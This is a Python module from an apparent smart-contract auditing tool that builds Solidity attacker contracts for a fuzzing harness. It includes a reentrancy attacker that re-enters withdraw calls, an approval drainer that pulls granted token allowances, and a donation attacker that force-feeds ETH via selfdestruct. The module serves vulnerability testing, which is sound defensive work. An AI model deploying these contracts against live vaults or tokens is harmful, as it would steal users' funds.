"""Malicious-contract generators for the attack simulator (Phase 1 upgrade).

The old simulator could only make simple moneyless calls from plain
accounts, which is why reentrancy, approval drains, and donation attacks
were structurally invisible to it. This module generates the *attacker*
side of the equation as plain Solidity sources: they are written into the
Foundry test project, deployed by the attack handler, and driven through
it — so exploits run through a real malicious contract, not a direct call.

All generation here is deterministic string building (no LLM, no
network), which keeps it unit-testable without forge.
"""

from __future__ import annotations

from dataclasses import dataclass

from web3guard.invariants.models import FunctionSig

#: Function-name aliases the harness recognizes as "put money in".
_DEPOSIT_ALIASES = ("deposit", "stake", "mint", "supply", "fund", "addliquidity")
#: Function-name aliases the harness recognizes as "take money out".
_WITHDRAW_ALIASES = (
    "withdraw",
    "unstake",
    "burn",
    "redeem",
    "claim",
    "exit",
    "cashout",
)


@dataclass
class VaultInterface:
    """A detected (deposit, withdraw) pair the reentrancy attacker can use.

    Phase 1 supports the canonical shape: a payable deposit-like function
    and a withdraw-like function taking a single ``uint`` amount. Anything
    fancier (multi-param withdraws, share-based flows) is skipped with an
    honest note instead of a broken attacker.
    """

    deposit_fn: str  # e.g. "deposit"
    deposit_sig: str  # e.g. "deposit()"
    withdraw_fn: str  # e.g. "withdraw"
    withdraw_sig: str  # e.g. "withdraw(uint256)"


@dataclass
class AttackerSpec:
    """One malicious contract to deploy inside the fuzz project."""

    name: str  # contract name, e.g. "ReentrancyAttacker"
    filename: str  # e.g. "test/attackers/ReentrancyAttacker.sol"
    source: str  # full Solidity source
    purpose: str  # plain-language note for reports/logs


def detect_vault_interface(functions: list[FunctionSig]) -> VaultInterface | None:
    """Find a (deposit, withdraw) pair usable by the reentrancy attacker."""
    deposit: FunctionSig | None = None
    withdraw: FunctionSig | None = None
    for fn in functions:
        lname = fn.name.lower()
        if deposit is None and lname in _DEPOSIT_ALIASES and fn.state_changing:
            deposit = fn
        if withdraw is None and lname in _WITHDRAW_ALIASES and fn.state_changing:
            # Needs a single uint amount parameter to be attackable.
            if len(fn.params) == 1 and fn.params[0][0].startswith("uint"):
                withdraw = fn
    if deposit is None or withdraw is None:
        return None
    dep_types = ",".join(t for t, _ in deposit.params)
    return VaultInterface(
        deposit_fn=deposit.name,
        deposit_sig=f"{deposit.name}({dep_types})",
        withdraw_fn=withdraw.name,
        withdraw_sig=f"{withdraw.name}(uint256)",
    )


def reentrancy_attacker_source(pragma: str = "pragma solidity ^0.8.20;") -> str:
    """A generic reentrancy attacker driven entirely by the handler.

    The handler deposits into the target *as* this contract, then triggers
    a withdrawal *as* this contract; ``receive()`` re-enters the target
    mid-call with harness-supplied calldata. Re-entry failures are
    swallowed on purpose: on a SAFE target the reentrant call reverts and
    the outer flow continues normally; on a VULNERABLE target it succeeds
    and the theft shows up as attacker profit.
    """
    return f"""// SPDX-License-Identifier: MIT
{pragma}

// Web3Guard-generated reentrancy attacker (attack simulator, Phase 1).
// Driven by the AttackHandler: arm() loads the target + the exact
// calldata to re-enter with, then the handler deposits and withdraws
// AS this contract so receive() fires mid-call.
contract ReentrancyAttacker {{
    address public target;
    bytes public reenterCalldata;
    uint256 public maxReentries = 3;
    uint256 public reentries;
    bool public armed;

    function arm(
        address _target,
        bytes calldata _reenterCalldata,
        uint256 _maxReentries
    ) external {{
        target = _target;
        reenterCalldata = _reenterCalldata;
        maxReentries = _maxReentries;
        reentries = 0;
        armed = true;
    }}

    function disarm() external {{
        armed = false;
    }}

    receive() external payable {{
        if (!armed || reentries >= maxReentries) return;
        reentries += 1;
        // Deliberately swallow failure: a safe target reverts here and
        // the outer flow continues; a vulnerable target lets us back in.
        (bool ok, ) = target.call(reenterCalldata);
        ok;
    }}
}}
"""


def approval_drainer_source(pragma: str = "pragma solidity ^0.8.20;") -> str:
    """A spender contract that drains whatever allowance a victim granted."""
    return f"""// SPDX-License-Identifier: MIT
{pragma}

// Web3Guard-generated approval-draining spender (attack simulator, Phase 1).
// The handler tricks (or fuzzes) a victim into approving this contract,
// then drain() pulls the tokens via transferFrom.
interface IWgERC20 {{
    function transferFrom(address from, address to, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
}}

contract ApprovalDrainer {{
    function drain(address token, address victim, uint256 amount) external {{
        uint256 allowed = IWgERC20(token).allowance(victim, address(this));
        uint256 amt = amount > allowed ? allowed : amount;
        if (amt > 0) {{
            IWgERC20(token).transferFrom(victim, address(this), amt);
        }}
    }}

    receive() external payable {{}}
}}
"""


def donation_attacker_source(pragma: str = "pragma solidity ^0.8.20;") -> str:
    """Force-feeds ETH via selfdestruct, bypassing receive()/fallback.

    The classic share-price / accounting donation: raw ETH appears in the
    target without going through any deposit function, so any invariant of
    the form ``balance == deposits - withdrawals`` breaks.
    """
    return f"""// SPDX-License-Identifier: MIT
{pragma}

// Web3Guard-generated donation attacker (attack simulator, Phase 1).
// donate() selfdestructs the held ETH into the target, which bypasses
// receive()/fallback entirely (EIP-6780 keeps the code, the ETH moves).
contract DonationAttacker {{
    receive() external payable {{}}

    function donate(address payable target) external {{
        selfdestruct(target);
    }}
}}
"""


def select_attackers(
    pragma: str,
    functions: list[FunctionSig],
) -> tuple[list[AttackerSpec], list[str]]:
    """Choose which attacker contracts to deploy for this target.

    Returns (specs, notes). Always includes the donation attacker (it is
    fully generic); adds the reentrancy attacker when a vault-like
    (deposit, withdraw) pair is detected, and the approval drainer when
    the target looks token-ish (approve/permit or transferFrom present).
    """
    specs: list[AttackerSpec] = []
    notes: list[str] = []

    specs.append(
        AttackerSpec(
            name="DonationAttacker",
            filename="test/attackers/DonationAttacker.sol",
            source=donation_attacker_source(pragma),
            purpose=(
                "force-feeds ETH via selfdestruct to break naive "
                "balance == deposits - withdrawals accounting"
            ),
        )
    )

    vault = detect_vault_interface(functions)
    if vault is not None:
        specs.append(
            AttackerSpec(
                name="ReentrancyAttacker",
                filename="test/attackers/ReentrancyAttacker.sol",
                source=reentrancy_attacker_source(pragma),
                purpose=(
                    f"re-enters {vault.withdraw_sig} mid-call to drain "
                    f"funds deposited via {vault.deposit_sig}"
                ),
            )
        )
    else:
        notes.append(
            "no (deposit, withdraw) pair detected: reentrancy attacker not deployed for this target"
        )

    names = {fn.name.lower() for fn in functions}
    if names & {"approve", "permit", "transferfrom", "increaseallowance"}:
        specs.append(
            AttackerSpec(
                name="ApprovalDrainer",
                filename="test/attackers/ApprovalDrainer.sol",
                source=approval_drainer_source(pragma),
                purpose=("drains token allowances victims granted to it via transferFrom"),
            )
        )
    else:
        notes.append(
            "no approve/permit/transferFrom interface: approval-draining "
            "spender not deployed for this target"
        )
    return specs, notes
